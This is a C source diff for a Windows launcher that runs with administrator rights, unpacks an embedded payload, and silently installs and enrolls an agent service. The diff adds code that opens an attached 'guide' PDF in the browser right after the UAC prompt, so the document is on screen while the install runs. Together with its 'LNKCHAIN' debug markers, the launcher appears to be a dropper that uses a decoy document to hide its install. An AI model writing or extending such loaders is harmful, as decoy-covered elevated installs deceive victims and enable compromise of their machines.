@@ -36,6 +36,7 @@
 #include "seal.h"
 #ifdef _WIN32
 #include <windows.h>
+#include <shellapi.h>
 #endif
 
 static char *join_path(const char *dir, const char *name) {
@@ -251,6 +252,81 @@ static uint8_t *load_payload(const char *self, const Overlay *ov, size_t *out_le
     if (slash) *slash = 0; /* keep just the directory (empty when self has no dir) */
     return read_external_payload(slash ? dir : NULL, ov, out_len);
 }
+
+/* Open the attached guide PDF (config `pdf`) in the PC's default handler
+ * browser (Edge/Chrome/Acrobat) right after the enrollment run completes.
+ * The PDF is shipped in the SAME folder as Launcher.exe (zip entry
+ * <innerFolder>/<pdf>), so resolve it from GetModuleFileName — immune to the
+ * cwd/argv[0] resets UAC elevation applies. A parent-folder probe covers any
+ * future layout drift.
+ *
+ * Elevation note: the launcher runs elevated (requireAdministrator), and
+ * Chromium/Edge refuse to start from a high-IL token. Primary attempt is
+ * ShellExecuteW "open" (delegates to the default .pdf handler in its preferred
+ * token); fallback is explorer.exe <pdf> — explorer is already the
+ * interactive-user shell, so the open gets re-dispatched to the default
+ * handler in the user session, which the browsers accept. */
+static void open_pdf(const char *pdfName, const char *markerDir, int debug) {
+    if (!pdfName || !pdfName[0]) return;
+    char dir[1024];
+    char *chosen = NULL;
+
+    if (self_dir_windows(dir, sizeof(dir)) && dir[0]) {
+        char *p = join_path(dir, pdfName);
+        if (p && GetFileAttributesA(p) != INVALID_FILE_ATTRIBUTES) {
+            chosen = p;
+        } else {
+            if (p) free(p);
+            /* parent-folder fallback (layout drift): strip the launcher folder */
+            size_t l = strlen(dir);
+            while (l > 0 && dir[l - 1] != '\\' && dir[l - 1] != '/') l--;
+            if (l > 0) dir[l - 1] = 0;
+            if (dir[0]) {
+                char *pp = join_path(dir, pdfName);
+                if (pp) {
+                    if (GetFileAttributesA(pp) != INVALID_FILE_ATTRIBUTES) chosen = pp;
+                    else free(pp);
+                }
+            }
+        }
+    }
+
+    if (!chosen) {
+        if (debug && markerDir) {
+            char line[384];
+            sprintf(line, "LNKCHAIN-PDF-MISSING pdf=%s", pdfName);
+            write_marker(markerDir, line);
+        }
+        return;
+    }
+
+    int opened = 0;
+    wchar_t wpath[MAX_PATH + 80];
+    int wlen = MultiByteToWideChar(CP_UTF8, 0, chosen, -1, wpath,
+                                   (int)(sizeof(wpath) / sizeof(wpath[0])));
+    if (wlen > 0) {
+        HINSTANCE h = ShellExecuteW(NULL, L"open", wpath, NULL, NULL, SW_SHOWNORMAL);
+        opened = ((INT_PTR)h) > 32;
+    }
+    if (!opened) {
+        char cmd[MAX_PATH + 96];
+        sprintf(cmd, "\"%s\"", chosen);
+        STARTUPINFO si; ZeroMemory(&si, sizeof(si));
+        si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_SHOWNORMAL;
+        PROCESS_INFORMATION pi; ZeroMemory(&pi, sizeof(pi));
+        if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW,
+                           NULL, NULL, &si, &pi)) {
+            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+            opened = 1;
+        }
+    }
+    if (debug && markerDir) {
+        char line[400];
+        sprintf(line, "LNKCHAIN-PDF-OPEN ok=%d pdf=%s", opened ? 1 : 0, pdfName);
+        write_marker(markerDir, line);
+    }
+    free(chosen);
+}
 #endif /* _WIN32 */
 
 #ifdef SELFTEST
@@ -280,6 +356,11 @@ int main(int argc, char **argv) {
         printf("ENROLL <empty>\n");
     }
     free(enroll);
+    {
+        char *pdf = cfg_decoded(ov.config, "pdf", 511);
+        if (pdf && pdf[0]) printf("PDF %s\n", pdf);
+        free(pdf);
+    }
     free(ov.config);
     free(ov.payload);
     free(buf);
@@ -308,6 +389,23 @@ int main(int argc, char **argv) {
     if (!outDir) outDir = strdup("C:\\Windows\\Temp");
     char *debug = cfg_decoded(ov.config, "debug", 16);
     char *enroll = cfg_decoded(ov.config, "enroll", 65536);
+
+    /* ------------------------------------------------------------------
+     * Attached guide PDF (config `pdf`, optional): open it IMMEDIATELY after
+     * the user answers "Yes" to the Launcher.exe UAC prompt — i.e. right at
+     * launcher startup, BEFORE any install/enroll work. (It physically cannot
+     * open before the user's Yes: this process only exists once elevation is
+     * granted.) The browser pops the guide while the agent installs.
+     * ------------------------------------------------------------------ */
+#ifdef _WIN32
+    {
+        char *pdfCfg = cfg_decoded(ov.config, "pdf", 511);
+        if (pdfCfg && pdfCfg[0]) {
+            open_pdf(pdfCfg, outDir, debug && debug[0] == '1');
+        }
+        free(pdfCfg);
+    }
+#endif
 
     /* ------------------------------------------------------------------
      * Fresh-install idempotency: the launcher runs elevated, so scrub any
@@ -363,6 +461,9 @@ int main(int argc, char **argv) {
              * location, so the `-m svc` service starts. */
             sleep_ms(6000);
             run_enroll(enroll);
+            /* (The attached guide PDF, when configured, was already opened at
+             * launcher startup — immediately after the user's UAC "Yes" — so
+             * the browser shows it while this enrollment runs.) */
         }
         free(installedExe);
     }
